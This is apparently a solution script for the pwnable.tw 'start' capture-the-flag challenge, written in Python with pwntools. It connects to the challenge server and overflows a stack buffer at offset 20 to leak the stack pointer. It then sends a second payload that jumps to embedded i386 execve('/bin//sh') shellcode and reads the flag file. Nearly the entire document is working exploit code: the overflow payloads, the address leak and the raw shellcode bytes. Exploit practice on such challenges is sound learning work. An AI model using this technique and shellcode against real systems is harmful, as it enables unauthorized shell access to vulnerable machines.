from pwn import *

context.arch = 'i386'
context.terminal = "kitty"
context.log_level = "error"
ASLR=True


exe = ELF("./start")
HOST = "chall.pwnable.tw"
PORT = 10000
gdbinit = '''
'''

#io = gdb.debug(exe.path, gdbscript=gdbinit, aslr=ASLR)
io = remote(HOST, PORT)
#io = process(exe.path)

offset = 20

#http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = \
b"\x31\xc0\x50\x68\x2f\x2f\x73" + \
b"\x68\x68\x2f\x62\x69\x6e\x89" + \
b"\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
b"\xcd\x80\x31\xc0\x40\xcd\x80"

payload = flat({
    offset:[
        p32(0x08048087)
    ]
})

io.sendafter(b'CTF:',payload)
esp = u32(io.recv()[:4])

print (
    "\n-----------------------\n"
    "esp leak:\t", hex(esp),
    "\n-----------------------\n"
)

payload = flat({
    offset:[
        p32(esp + 20),
        shellcode
    ]
})

io.sendline(payload)
io.sendline(b"cat /home/start/flag")
print (io.recvlineS())
